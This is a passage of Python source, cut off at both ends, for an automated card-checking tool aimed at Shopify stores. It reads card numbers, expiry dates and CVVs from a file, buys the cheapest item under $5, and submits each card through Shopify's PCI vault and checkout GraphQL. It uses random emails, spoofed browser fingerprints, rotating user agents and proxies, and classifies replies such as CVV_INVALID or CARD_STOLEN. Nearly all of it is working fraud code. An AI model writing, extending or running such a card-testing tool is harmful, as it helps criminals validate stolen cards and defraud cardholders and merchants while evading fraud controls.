    "incorrect cvc": "CVV_INVALID", "incorrect_cvc": "CVV_INVALID",
    "security code": "CVV_INVALID",
    "stolen card": "CARD_STOLEN", "lost card": "CARD_STOLEN", "pickup card": "CARD_STOLEN",
    "address": "ADDRESS_INVALID", "zip": "ZIP_INVALID", "postal": "ZIP_INVALID",
    "throttled": "RATE_LIMITED", "too many": "RATE_LIMITED", "rate limit": "RATE_LIMITED",
    "gateway": "GATEWAY_ERROR", "processing error": "GATEWAY_ERROR",
    "inventory": "OUT_OF_STOCK", "out of stock": "OUT_OF_STOCK", "unavailable": "OUT_OF_STOCK",
    "captcha": "CAPTCHA_REQUIRED",
    "terms": "TERMS_REQUIRED",
    "payment method": "PAYMENT_METHOD_INVALID",
}


def _map_error(raw: str) -> str:
    low = raw.lower()
    for keyword, code in _SHOPIFY_ERROR_MAP.items():
        if keyword in low:
            return code
    return raw.upper().replace(" ", "_")[:40]


def extract_any_error(submit_body: str) -> str:
    for pattern in [
        r'"nonLocalizedMessage"\s*:\s*"([^"]+)"',
        r'"localizedMessage"\s*:\s*"([^"]+)"',
        r'"code"\s*:\s*"([^"]+)"',
        r'"message"\s*:\s*"([^"]+)"',
    ]:
        match = re.search(pattern, submit_body)
        if match:
            return _map_error(match.group(1))
    return ""


def extract_submit_error(submit_body: str) -> str:
    match = re.search(r'"nonLocalizedMessage"\s*:\s*"([^"]+)"', submit_body)
    if match:
        return match.group(1)
    match = re.search(r'"code"\s*:\s*"([^"]+)"', submit_body)
    return match.group(1) if match else ""


def extract_receipt_status_code(poll_body: str, receipt_type: str) -> str:
    if receipt_type in ["SuccessfulReceipt", "ProcessedReceipt"]:
        return "ORDER_PLACED"
    if receipt_type == "ProcessingReceipt":
        return "PROCESSING"
    match = re.search(r'"code"\s*:\s*"([^"]+)"', poll_body)
    if match:
        code = match.group(1)
        if "CAPTCHA" in code:
            return "CAPTCHA_REQUIRED"
        return code
    if "CAPTCHA" in poll_body:
        return "CAPTCHA_REQUIRED"
    if receipt_type == "FailedReceipt":
        return "FAILED"
    return "UNKNOWN"


def detect_shipping_restriction(proposal_body: str) -> bool:
    restriction_signals = [
        "SHIPPING_ADDRESS_UNDELIVERABLE",
        "no_delivery_options_available",
        "noDeliveryOptionsAvailable",
        "delivery is not available",
        "does not ship to",
    ]
    lower = proposal_body.lower()
    return any(s.lower() in lower for s in restriction_signals)


# ──────────────────────── Payload helpers ────────────────────────────

def patch_payload(payload: str, currency: str, country: str) -> str:
    if currency == "USD" and country == "US":
        return payload
    try:
        data = json.loads(payload)
    except json.JSONDecodeError:
        logger.error("patch_payload: JSON parse failed — falling back to string replace")
        if currency != "USD":
            payload = payload.replace('"currencyCode":"USD"', f'"currencyCode":"{currency}"')
            payload = payload.replace('"presentmentCurrency":"USD"', f'"presentmentCurrency":"{currency}"')
        if country != "US":
            payload = payload.replace('"phoneCountryCode":"US"', f'"phoneCountryCode":"{country}"')
        return payload

    def _walk(obj: object) -> object:
        if isinstance(obj, dict):
            patched: Dict = {}
            for k, v in obj.items():
                if k == "presentmentCurrency" and v == "USD" and currency != "USD":
                    patched[k] = currency
                elif k == "phoneCountryCode" and v == "US" and country != "US":
                    patched[k] = country
                elif k == "countryCode" and v == "US" and country != "US" and _in_buyer_identity[0]:
                    patched[k] = country
                elif k == "customer":
                    _in_buyer_identity[0] = True
                    patched[k] = _walk(v)
                    _in_buyer_identity[0] = False
                else:
                    patched[k] = _walk(v)
            return patched
        if isinstance(obj, list):
            return [_walk(i) for i in obj]
        return obj

    _in_buyer_identity = [False]
    patched_data = _walk(data)
    return json.dumps(patched_data, separators=(",", ":"))


def generate_attempt_token(checkout_token: str) -> str:
    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    return f"{checkout_token}-{''.join(random.choice(chars) for _ in range(10))}"


def generate_page_id() -> str:
    return f"{random.getrandbits(64):016x}"


# ──────────────────────── Step 9: PCI tokenisation ───────────────────

def send_pci_session(ident_sig: str, card_number: str, card_name: str,
                     card_month: int, card_year: int, cvv: str,
                     shop_domain: str, proxy_url: str = "",
                     vault_url: str = "", vault_domain: str = "",
                     impersonate: str = "chrome124") -> Tuple[int, str]:
    _DEFAULT_VAULT = "https://checkout.pci.shopifyinc.com/sessions"
    endpoint = vault_url or _DEFAULT_VAULT
    scope = vault_domain or shop_domain
    origin_base = endpoint.rsplit("/sessions", 1)[0] if "/sessions" in endpoint else "https://checkout.pci.shopifyinc.com"
    payload = json.dumps({
        "credit_card": {
            "number": card_number,
            "month": card_month,
            "year": card_year,
            "verification_value": cvv,
            "start_month": None,
            "start_year": None,
            "issue_number": "",
            "name": card_name,
        },
        "payment_session_scope": scope,
    })
    headers = {
        "accept": "application/json",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": origin_base,
        "priority": "u=1, i",
        "referer": f"{origin_base}/build/a8e4a94/number-ltr.html?identifier=&locationURL=",
        "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "sec-fetch-storage-access": "active",
        "shopify-identification-signature": ident_sig,
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
    }
    with Session(impersonate=impersonate) as session:
        post_kwargs = {"data": payload, "headers": headers, "timeout": 20}
        if proxy_url:
            post_kwargs["proxy"] = proxy_url
        with _GLOBAL_SEM:
            resp = session.post(endpoint, **post_kwargs)
    return resp.status_code, resp.text


# ──────────────────────── Proposal headers ───────────────────────────

def _proposal_headers(shop_url: str, checkout_url: str, checkout_token: str,
                      session_token: str, build_id: str, source_token: str) -> Dict:
    return {
        "accept": "application/json",
        "accept-language": "en-US",
        "content-type": "application/json",
        "origin": shop_url,
        "priority": "u=1, i",
        "referer": checkout_url,
        "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "shopify-checkout-client": "checkout-web/1.0",
        "shopify-checkout-source": f'id="{checkout_token}", type="cn"',
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
        "x-checkout-one-session-token": session_token,
        "x-checkout-web-build-id": build_id,
        "x-checkout-web-deploy-stage": "production",
        "x-checkout-web-server-handling": "fast",
        "x-checkout-web-server-rendering": "yes",
        "x-checkout-web-source-id": source_token,
    }


# ──────────────────────── Step 4: Proposal 1 ─────────────────────────

def send_proposal(client: TLSClient, shop_url: str, checkout_url: str, checkout_token: str,
                  session_token: str, stable_id: str, variant_id: str, price: str,
                  proposal_id: str, build_id: str, source_token: str,
                  currency: str, country: str) -> Tuple[int, str]:
    addr = pick_address_for_store(shop_url, currency, country)
    gql_payload = f'''{{
  "variables": {{
    "sessionInput": {{"sessionToken": "{session_token}"}},
    "queueToken": null,
    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
    "delivery": {{
      "deliveryLines": [{{
        "destination": {{
          "partialStreetAddress": {{
            "address1": "{addr.address1}",
            "address2": "{addr.address2}",
            "city": "{addr.city}",
            "countryCode": "{addr.country_code}",
            "postalCode": "{addr.postal_code}",
            "firstName": "{addr.first_name}",
            "lastName": "{addr.last_name}",
            "zoneCode": "{addr.zone_code}",
            "phone": "{addr.phone}",
            "oneTimeUse": false
          }}
        }},
        "selectedDeliveryStrategy": {{
          "deliveryStrategyMatchingConditions": {{
            "estimatedTimeInTransit": {{"any": true}},
            "shipments": {{"any": true}}
          }},
          "options": {{}}
        }},
        "targetMerchandiseLines": {{"any": true}},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {{"any": true}},
        "destinationChanged": true
      }}],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{"deliveryExpectationLines": []}},
    "merchandise": {{
      "merchandiseLines": [{{
        "stableId": "{stable_id}",
        "merchandise": {{
          "productVariantReference": {{
            "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
            "variantId": "gid://shopify/ProductVariant/{variant_id}",
            "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
          }}
        }},
        "quantity": {{"items": {{"value": 1}}}},
        "expectedTotalPrice": {{"any": true}},
        "lineComponentsSource": null, "lineComponents": []
      }}]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{
      "totalAmount": {{"any": true}},
      "paymentLines": [],
      "billingAddress": {{
        "streetAddress": {{
          "address1": "{addr.address1}", "address2": "{addr.address2}",
          "city": "{addr.city}", "countryCode": "{addr.country_code}",
          "postalCode": "{addr.postal_code}", "firstName": "{addr.first_name}",
          "lastName": "{addr.last_name}", "zoneCode": "{addr.zone_code}",
          "phone": "{addr.phone}"
        }}
      }}
    }},
    "buyerIdentity": {{
      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {{"countryCode": "US"}},
      "rememberMe": false
    }},
    "tip": {{"tipLines": []}},
    "poNumber": null,
    "taxes": {{
      "proposedAllocations": null,
      "proposedTotalAmount": {{"any": true}},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    }},
    "note": {{"message": null, "customAttributes": []}},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{
      "signature": null, "signatureUuid": null,
      "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
    }},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": []
  }},
  "operationName": "Proposal",
  "id": "{proposal_id}"
}}'''
    gql_payload = patch_payload(gql_payload, currency, country)
    resp = client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
        data=gql_payload,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    )
    return resp.status_code, resp.text


# ──────────────────────── Step 5: Proposal 2 (email) ─────────────────

def send_proposal2(client: TLSClient, shop_url: str, checkout_url: str, checkout_token: str,
                   session_token: str, stable_id: str, variant_id: str, price: str,
                   proposal_id: str, build_id: str, source_token: str, queue_token: str,
                   email: str, currency: str, country: str) -> Tuple[int, str]:
    addr = pick_address_for_store(shop_url, currency, country)
    gql_payload = f'''{{
  "variables": {{
    "sessionInput": {{"sessionToken": "{session_token}"}},
    "queueToken": "{queue_token}",
    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
    "delivery": {{
      "deliveryLines": [{{
        "destination": {{
          "partialStreetAddress": {{
            "address1": "{addr.address1}",
            "address2": "{addr.address2}",
            "city": "{addr.city}",
            "countryCode": "{addr.country_code}",
            "postalCode": "{addr.postal_code}",
            "firstName": "{addr.first_name}",
            "lastName": "{addr.last_name}",
            "zoneCode": "{addr.zone_code}",
            "phone": "{addr.phone}",
            "oneTimeUse": false
          }}
        }},
        "selectedDeliveryStrategy": {{
          "deliveryStrategyMatchingConditions": {{
            "estimatedTimeInTransit": {{"any": true}},
            "shipments": {{"any": true}}
          }},
          "options": {{}}
        }},
        "targetMerchandiseLines": {{"any": true}},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {{"any": true}},
        "destinationChanged": true
      }}],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{"deliveryExpectationLines": []}},
    "merchandise": {{
      "merchandiseLines": [{{
        "stableId": "{stable_id}",
        "merchandise": {{
          "productVariantReference": {{
            "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
            "variantId": "gid://shopify/ProductVariant/{variant_id}",
            "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
          }}
        }},
        "quantity": {{"items": {{"value": 1}}}},
        "expectedTotalPrice": {{"any": true}},
        "lineComponentsSource": null, "lineComponents": []
      }}]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{
      "totalAmount": {{"any": true}},
      "paymentLines": [],
      "billingAddress": {{
        "streetAddress": {{
          "address1": "{addr.address1}", "address2": "{addr.address2}",
          "city": "{addr.city}", "countryCode": "{addr.country_code}",
          "postalCode": "{addr.postal_code}", "firstName": "{addr.first_name}",
          "lastName": "{addr.last_name}", "zoneCode": "{addr.zone_code}",
          "phone": "{addr.phone}"
        }}
      }}
    }},
    "buyerIdentity": {{
      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
      "email": "{email}",
      "emailChanged": true,
      "phoneCountryCode": "US",
      "marketingConsent": [{{"email": {{"value": "{email}"}}}}],
      "shopPayOptInPhone": {{"countryCode": "US"}},
      "rememberMe": false
    }},
    "tip": {{"tipLines": []}},
    "poNumber": null,
    "taxes": {{
      "proposedAllocations": null,
      "proposedTotalAmount": {{"any": true}},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    }},
    "note": {{"message": null, "customAttributes": []}},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{
      "signature": null, "signatureUuid": null,
      "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
    }},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": []
  }},
  "operationName": "Proposal",
  "id": "{proposal_id}"
}}'''
    gql_payload = patch_payload(gql_payload, currency, country)
    resp = client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
        data=gql_payload,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    )
    return resp.status_code, resp.text


# ──────────────────────── Step 6: Proposal 3 (address) ───────────────

def send_proposal3(client: TLSClient, shop_url: str, checkout_url: str, checkout_token: str,
                   session_token: str, stable_id: str, variant_id: str, price: str,
                   proposal_id: str, build_id: str, source_token: str, queue_token: str,
                   email: str, addr: Address, currency: str, country: str) -> Tuple[int, str]:
    gql_payload = f'''{{
  "variables": {{
    "sessionInput": {{"sessionToken": "{session_token}"}},
    "queueToken": "{queue_token}",
    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
    "delivery": {{
      "deliveryLines": [{{
        "destination": {{
          "partialStreetAddress": {{
            "address1": "{addr.address1}",
            "address2": "{addr.address2}",
            "city": "{addr.city}",
            "countryCode": "{addr.country_code}",
            "postalCode": "{addr.postal_code}",
            "firstName": "{addr.first_name}",
            "lastName": "{addr.last_name}",
            "zoneCode": "{addr.zone_code}",
            "phone": "{addr.phone}",
            "oneTimeUse": false
          }}
        }},
        "selectedDeliveryStrategy": {{
          "deliveryStrategyMatchingConditions": {{
            "estimatedTimeInTransit": {{"any": true}},
            "shipments": {{"any": true}}
          }},
          "options": {{}}
        }},
        "targetMerchandiseLines": {{"any": true}},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {{"any": true}},
        "destinationChanged": true
      }}],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{"deliveryExpectationLines": []}},
    "merchandise": {{
      "merchandiseLines": [{{
        "stableId": "{stable_id}",
        "merchandise": {{
          "productVariantReference": {{
            "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
            "variantId": "gid://shopify/ProductVariant/{variant_id}",
            "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
          }}
        }},
        "quantity": {{"items": {{"value": 1}}}},
        "expectedTotalPrice": {{"any": true}},
        "lineComponentsSource": null, "lineComponents": []
      }}]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{
      "totalAmount": {{"any": true}},
      "paymentLines": [],
      "billingAddress": {{
        "streetAddress": {{
          "address1": "{addr.address1}",
          "address2": "{addr.address2}",
          "city": "{addr.city}",
          "countryCode": "{addr.country_code}",
          "postalCode": "{addr.postal_code}",
          "firstName": "{addr.first_name}",
          "lastName": "{addr.last_name}",
          "zoneCode": "{addr.zone_code}",
          "phone": "{addr.phone}"
        }}
      }}
    }},
    "buyerIdentity": {{
      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
      "email": "{email}",
      "emailChanged": false,
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {{"countryCode": "US"}},
      "rememberMe": false
    }},
    "tip": {{"tipLines": []}},
    "poNumber": null,
    "taxes": {{
      "proposedAllocations": null,
      "proposedTotalAmount": {{"any": true}},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    }},
    "note": {{"message": null, "customAttributes": []}},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{
      "signature": null, "signatureUuid": null,
      "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
    }},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": []
  }},
  "operationName": "Proposal",
  "id": "{proposal_id}"
}}'''
    gql_payload = patch_payload(gql_payload, currency, country)
    resp = client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
        data=gql_payload,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    )
    return resp.status_code, resp.text


# ──────────────────────── Step 11: PollForReceipt ────────────────────

def send_poll_for_receipt(client: TLSClient, shop_url: str, checkout_url: str, checkout_token: str,
                          session_token: str, build_id: str, source_token: str,
                          poll_id: str, receipt_id: str, receipt_session_token: str) -> Tuple[int, str]:
    params = {
        "operationName": "PollForReceipt",
        "variables": json.dumps({"receiptId": receipt_id, "sessionToken": receipt_session_token}),
        "id": poll_id,
    }
    full_url = f"{shop_url}/checkouts/internal/graphql/persisted?{urllib.parse.urlencode(params)}"
    headers = _proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    headers["x-checkout-web-source-id"] = checkout_token
    resp = client.get(full_url, headers=headers)
    return resp.status_code, resp.text


# ──────────────────────── Step 10: SubmitForCompletion ───────────────

def send_submit_for_completion(client: TLSClient, shop_url: str, checkout_url: str, checkout_token: str,
                               session_token: str, stable_id: str, variant_id: str, price: str,
                               submit_id: str, build_id: str, source_token: str, queue_token: str,
                               email: str, addr: Address, delivery_handle: str, shipping_amount: str,
                               total_amount: str, pci_session_id: str, attempt_token: str,
                               currency: str, country: str, signed_handles: List[str],
                               is_digital: bool = False,
                               item_amount: str = None,
                               tax_amount: str = None) -> Tuple[int, str]:
    handle_lines = [json.dumps({"signedHandle": h}) for h in (signed_handles or [])]
    signed_handles_json = "[" + ",".join(handle_lines) + "]"
    page_id = generate_page_id()

    if is_digital:
        total_amount_block = '"totalAmount": {"any": true}'
    else:
        total_amount_block = f'"totalAmount": {{"value": {{"amount": "{total_amount}", "currencyCode": "USD"}}}}'

    if is_digital:
        delivery_block = f'''
      "delivery": {{
        "deliveryLines": [{{
          "selectedDeliveryStrategy": {{
            "deliveryStrategyMatchingConditions": {{
              "estimatedTimeInTransit": {{"any": true}},
              "shipments": {{"any": true}}
            }},
            "options": {{}}
          }},
          "targetMerchandiseLines": {{"lines": [{{"stableId": "{stable_id}"}}]}},
          "deliveryMethodTypes": ["NONE"],
          "expectedTotalPrice": {{"any": true}},
          "destinationChanged": true
        }}],
        "noDeliveryRequired": [],
        "useProgressiveRates": false,
        "prefetchShippingRatesStrategy": null,
        "supportsSplitShipping": true
      }},
      "deliveryExpectations": {{"deliveryExpectationLines": []}}'''
    else:
        delivery_block = f'''
      "delivery": {{
        "deliveryLines": [{{
          "destination": {{
            "streetAddress": {{
              "address1": "{addr.address1}",
              "address2": "{addr.address2}",
              "city": "{addr.city}",
              "countryCode": "{addr.country_code}",
              "postalCode": "{addr.postal_code}",
              "firstName": "{addr.first_name}",
              "lastName": "{addr.last_name}",
              "zoneCode": "{addr.zone_code}",
              "phone": "{addr.phone}",
              "oneTimeUse": false
            }}
          }},
          "selectedDeliveryStrategy": {{
            "deliveryStrategyByHandle": {{
              "handle": "{delivery_handle}",
              "customDeliveryRate": false
            }},
            "options": {{}}
          }},
          "targetMerchandiseLines": {{"lines": [{{"stableId": "{stable_id}"}}]}},
          "deliveryMethodTypes": ["SHIPPING"],
          "expectedTotalPrice": {{"any": true}},
          "destinationChanged": false
        }}],
        "noDeliveryRequired": [],
        "useProgressiveRates": false,
        "prefetchShippingRatesStrategy": null,
        "supportsSplitShipping": true
      }},
      "deliveryExpectations": {{"deliveryExpectationLines": {signed_handles_json}}}'''

    tax_val = tax_amount or "0.0"
    tax_block = f'"proposedTotalAmount": {{"value": {{"amount": "{tax_val}", "currencyCode": "USD"}}}}'

    gql_payload = f'''{{
  "variables": {{
    "input": {{
      "sessionInput": {{"sessionToken": "{session_token}"}},
      "queueToken": "{queue_token}",
      "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
      {delivery_block},
      "merchandise": {{
        "merchandiseLines": [{{
          "stableId": "{stable_id}",
          "merchandise": {{
            "productVariantReference": {{
              "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
              "variantId": "gid://shopify/ProductVariant/{variant_id}",
              "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
            }}
          }},
          "quantity": {{"items": {{"value": 1}}}},
          "expectedTotalPrice": {{"any": true}},
          "lineComponentsSource": null, "lineComponents": []
        }}]
      }},
      "memberships": {{"memberships": []}},
      "payment": {{
        {total_amount_block},
        "paymentLines": [{{
          "paymentMethod": {{
            "directPaymentMethod": {{
              "sessionId": "{pci_session_id}",
              "billingAddress": {{
                "streetAddress": {{
                  "address1": "{addr.address1}",
                  "address2": "{addr.address2}",
                  "city": "{addr.city}",
                  "countryCode": "{addr.country_code}",
                  "postalCode": "{addr.postal_code}",
                  "firstName": "{addr.first_name}",
                  "lastName": "{addr.last_name}",
                  "zoneCode": "{addr.zone_code}",
                  "phone": "{addr.phone}"
                }}
              }},
              "cardSource": null
            }},
            "giftCardPaymentMethod": null,
            "redeemablePaymentMethod": null,
            "walletPaymentMethod": null,
            "walletsPlatformPaymentMethod": null,
            "localPaymentMethod": null,
            "paymentOnDeliveryMethod": null,
            "paymentOnDeliveryMethod2": null,
            "manualPaymentMethod": null,
            "customPaymentMethod": null,
            "offsitePaymentMethod": null,
            "customOnsitePaymentMethod": null,
            "deferredPaymentMethod": null,
            "customerCreditCardPaymentMethod": null,
            "paypalBillingAgreementPaymentMethod": null,
            "remotePaymentInstrument": null
          }},
          "amount": {{"value": {{"amount": "{total_amount}", "currencyCode": "USD"}}}}
        }}],
        "billingAddress": {{
          "streetAddress": {{
            "address1": "{addr.address1}",
            "address2": "{addr.address2}",
            "city": "{addr.city}",
            "countryCode": "{addr.country_code}",
            "postalCode": "{addr.postal_code}",
            "firstName": "{addr.first_name}",
            "lastName": "{addr.last_name}",
            "zoneCode": "{addr.zone_code}",
            "phone": "{addr.phone}"
          }}
        }}
      }},
      "buyerIdentity": {{
        "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
        "email": "{email}",
        "emailChanged": false,
        "phoneCountryCode": "US",
        "marketingConsent": [{{"email": {{"value": "{email}"}}}}],
        "shopPayOptInPhone": {{"countryCode": "US"}},
        "rememberMe": false
      }},
      "tip": {{"tipLines": []}},
      "poNumber": null,
      "taxes": {{
        "proposedAllocations": null,
        {tax_block},
        "proposedTotalIncludedAmount": null,
        "proposedMixedStateTotalAmount": null,
        "proposedExemptions": []
      }},
      "note": {{"message": null, "customAttributes": []}},
      "localizationExtension": {{"fields": []}},
      "nonNegotiableTerms": null,
      "scriptFingerprint": {{
        "signature": null, "signatureUuid": null,
        "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
      }},
      "optionalDuties": {{"buyerRefusesDuties": false}},
      "cartMetafields": []
    }},
    "attemptToken": "{attempt_token}",
    "metafields": [],
    "analytics": {{
      "requestUrl": "{checkout_url}",
      "pageId": "{page_id}"
    }}
  }},
  "operationName": "SubmitForCompletion",
  "id": "{submit_id}"
}}'''
    gql_payload = patch_payload(gql_payload, currency, country)
    resp = client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion",
        data=gql_payload,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    )
    return resp.status_code, resp.text


# ──────────────────────── Error checking ─────────────────────────────

def check_proposal_errors(step: str, status: int, body: str):
    if status != 200:
        body_snip = (body or "")[:200].replace("\n", " ")
        logger.warning("%s: unexpected HTTP %d (body: %r)", step, status, body_snip)
    matches = re.findall(
        r'"code"\s*:\s*"([^"]+)"\s*,\s*"localizedMessage"\s*:\s*"[^"]*"\s*,\s*"nonLocalizedMessage"\s*:\s*"([^"]*)"',
        body,
    )
    if not matches:
        return
    for code, msg in matches:
        logger.warning("%s proposal error — code=%s msg=%s", step, code, msg)
    _hard_stop = {"CARD_DECLINED", "CARD_EXPIRED", "CARD_INVALID", "CVV_INVALID",
                  "CARD_STOLEN", "DO_NOT_HONOR", "RISK_REJECTED"}
    for code, _ in matches:
        if code.upper() in _hard_stop:
            raise HardDecline(code.upper())


def check_submit_errors(status: int, body: str):
    if status != 200:
        body_snip = (body or "")[:200].replace("\n", " ")
        logger.warning("check_submit_errors: HTTP %d (body: %r)", status, body_snip)
    match = re.search(r'"__typename"\s*:\s*"(SubmitSuccess|SubmitAlreadyAccepted|SubmitFailed|SubmitThrottled)"', body)
    if match:
        typename = match.group(1)
        if typename != "SubmitSuccess":
            for i, (code, msg) in enumerate(re.findall(
                r'"code"\s*:\s*"([^"]+)"\s*,\s*"localizedMessage"\s*:\s*"[^"]*"\s*,\s*"nonLocalizedMessage"\s*:\s*"([^"]*)"',
                body)):
                logger.warning("submit error #%d: code=%s msg=%s", i + 1, code, msg)


# ──────────────────────── Card parsing ───────────────────────────────

def parse_card_entry(card_entry: str) -> Tuple[str, int, int, str]:
    card_parts = card_entry.strip().split('|')
    if len(card_parts) != 4:
        raise Exception(f"invalid card format in file: {card_entry}")
    try:
        card_month = int(card_parts[1])
        card_year = int(card_parts[2])
    except ValueError as e:
        raise Exception(f"invalid card month/year in file: {e}")
    return card_parts[0], card_month, card_year, card_parts[3]


# ──────────────────────── Orchestrator ───────────────────────────────

def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "", low: bool = True) -> CheckResult:
    currency = "USD"
    country = "US"
    site_name = shop_url.replace("https://", "").replace("http://", "")

    result = CheckResult(
        card=card_entry,
        shop_url=shop_url,
        site_name=site_name,
        currency=currency,
        status=CheckStatus.ERROR
    )

    try:
        card_number, card_month, card_year, card_cvv = parse_card_entry(card_entry)
    except Exception as e:
        logger.warning("card parse failed: %r", e)
        result.error = e
        return result

    if proxy_url and not is_proxy_alive(proxy_url):
        logger.warning("proxy health check failed: %s", proxy_url.split("@")[-1])
        result.status = CheckStatus.ERROR
        result.status_code = "PROXY_DEAD"
        result.error = Exception("proxy did not respond to health check")
        result.retryable = False
        return result

    email = generate_random_email()
    impersonate = random.choice(BROWSER_PROFILES)
    user_agent = random.choice(USER_AGENTS)

    client = TLSClient(timeout=20, proxy_url=proxy_url,
                       impersonate=impersonate, user_agent=user_agent)

    try:
        # Step 0
        try:
            _max_p = 5.00 if low else float("inf")
            logger.info(_redact(f"Step 0: find cheapest product on {shop_url} (max_price=${_max_p:.2f})"))
            title, product_id, variant_id, price = find_cheapest_product(client, shop_url, max_price=_max_p)
            logger.info(_redact(f"Step 0 OK: {title!r} variant={variant_id} price={price}"))
            _ = title, product_id
        except Exception as e:
            logger.warning("Step 0 failed: %r", e)
            result.status = CheckStatus.ERROR
            result.retryable = True
            result.error = Exception(f"Step 0 failed: {e}")
            return result

        # Step 1
        try:
            checkout_url, checkout_token, session_token, checkout_html = add_to_cart_and_checkout(client, shop_url, variant_id)
            stable_id = extract_stable_id(checkout_html)
            build_id = extract_commit_sha(checkout_html)
            source_token = extract_source_token(checkout_html)
            if not stable_id or not build_id or not source_token:
                raise Exception(
                    f"missing tokens (stableId={bool(stable_id)}, "
                    f"buildId={bool(build_id)}, sourceToken={bool(source_token)})"
                )
            logger.info("Step 1 OK: checkout_url=%s", _redact(checkout_url))
        except Exception as e:
            logger.warning("Step 1 failed: %r", e)
            result.status = CheckStatus.ERROR
            result.retryable = True
            result.error = Exception(f"Step 1 failed: {e}")
            return result

        # Step 2
        try:
            pat_id = extract_private_access_token_id(checkout_html)
            if not pat_id:
                raise Exception("could not extract private_access_token id")
            fetch_private_access_token(client, shop_url, checkout_url, pat_id)
            logger.info("Step 2 OK: pat_id=%s…", pat_id[:8])
        except Exception as e:
            logger.warning("Step 2 failed: %r", e)
            result.status = CheckStatus.ERROR
            result.retryable = True
            result.error = Exception(f"Step 2 failed: {e}")
            return result

        # Step 3
        try:
            actions_url = extract_actions_js_url(checkout_html, shop_url)
            if not actions_url:
                raise Exception("could not find actions JS URL")
            js_body = fetch_actions_js(client, actions_url, shop_url)
            proposal_id = extract_proposal_id(js_body)
            submit_id = extract_submit_for_completion_id(js_body)
            if not proposal_id or not submit_id:
                raise Exception("missing Proposal or Submit ID")
            poll_for_receipt_id = extract_poll_for_receipt_id(js_body)
            if not poll_for_receipt_id:
                raise Exception("could not extract PollForReceipt operation ID")
            logger.info("Step 3 OK: proposal_id=%s… submit_id=%s… poll_id=%s…",
